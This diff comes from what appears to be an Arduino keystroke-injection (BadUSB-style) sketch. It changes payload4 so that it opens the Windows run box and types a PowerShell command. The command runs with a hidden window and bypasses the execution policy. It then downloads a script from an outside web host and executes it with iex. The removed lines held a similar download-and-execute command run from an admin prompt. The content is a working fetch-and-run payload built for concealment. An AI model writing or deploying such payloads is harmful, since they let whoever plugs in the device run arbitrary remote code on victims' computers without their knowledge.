@@ -67,8 +67,8 @@ void payload3(){
   returnRelease();
 }
 void payload4(){
-  openCmdAsAdmin();
-  Keyboard.print("@powershell -NoProfile -ExecutionPolicy Bypass -Command \"iex ((New-Object System.Net.WebClient).DownloadString('http://robertbarrett.com/files/helloworld.ps1'))\" && SET \"PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin\"@powershell -NoProfile -ExecutionPolicy Bypass -Command \"iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))\" && SET \"PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin\"");
+  runBox();
+  Keyboard.print("powershell.exe -windowstyle hidden -NoProfile -ExecutionPolicy Bypass -Command \"iex ((New-Object System.Net.WebClient).DownloadString('http://robertbarrett.com/files/helloworld.ps1'))\"");
   returnRelease();
 }
 
